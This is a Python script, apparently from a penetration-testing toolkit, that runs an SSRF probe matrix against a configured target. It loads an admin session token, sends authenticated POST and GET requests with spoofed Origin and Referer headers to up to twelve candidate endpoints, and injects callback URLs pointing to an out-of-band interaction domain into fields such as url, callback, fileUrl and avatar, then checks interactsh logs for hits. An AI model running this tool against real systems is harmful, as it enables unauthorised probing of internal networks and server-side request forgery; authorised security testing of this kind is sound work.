"""V8 SSRF 全参数矩阵（OAST）。"""
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1]))
from runner import public_config as _pub
import os, json, time, random, sys
import requests, urllib3
urllib3.disable_warnings()
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE = _pub.target()
tok = open(os.path.join(ROOT, 'evidence', 'tokens', 'admin02.txt'), encoding='utf-8').read().strip()
cand = json.load(open(os.path.join(ROOT, 'knowledge', 'detect_candidates.json'), encoding='utf-8'))
eps = (cand.get('by_rule') or {}).get('ssrf_xxe') or []
state = json.load(open(os.path.join(ROOT, 'adapters', 'oast', 'oast_state.json'), encoding='utf-8'))
domain = state['domain']
fields = ['url', 'uri', 'callback', 'fileUrl', 'redirect', 'path', 'importFile', 'addr', 'rtsp', 'stream', 'model', 'file', 'avatar', 'photo', 'link']
result = {'generated_at': time.strftime('%Y-%m-%dT%H:%M:%S'), 'domain': domain, 'probes': [], 'oast_hits': []}
tokens = {}
for (i, ep) in enumerate(eps[:12]):
    path = ep['path']
    method = ep.get('method', 'POST')
    for f in fields[:8]:
        token = f'ssrfm{i}-{f}-{random.randint(100000, 999999)}'
        tokens[token] = {'path': path, 'field': f}
        try:
            h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': tok, 'Content-Type': 'application/json'}
            if method == 'POST':
                r = requests.post(BASE + path, headers=h, params={'t': str(int(time.time() * 1000))}, json={f: f'http://{token}.{domain}/p'}, timeout=15, verify=False)
            else:
                r = requests.get(BASE + path, headers=h, params={'t': str(int(time.time() * 1000)), f: f'http://{token}.{domain}/p'}, timeout=15, verify=False)
            try:
                j = r.json()
            except Exception:
                j = {'raw': r.text[:120]}
            result['probes'].append({'path': path, 'method': method, 'field': f, 'http': r.status_code, 'code': j.get('code'), 'msg': j.get('msg'), 'token': token})
        except Exception as e:
            result['probes'].append({'path': path, 'method': method, 'field': f, 'error': str(e)[:100], 'token': token})
time.sleep(8)
jsonl = os.path.join(ROOT, 'tools_cache', 'interactsh', 'interactions.jsonl')
if os.path.exists(jsonl):
    for line in open(jsonl, encoding='utf-8', errors='replace'):
        for t in tokens:
            if t in line:
                result['oast_hits'].append({'token': t, **tokens[t]})
json.dump(result, open(os.path.join(ROOT, 'reports', 'final', 'ssrf_matrix.json'), 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
print('probes:', len(result['probes']), 'oast_hits:', len(result['oast_hits']))
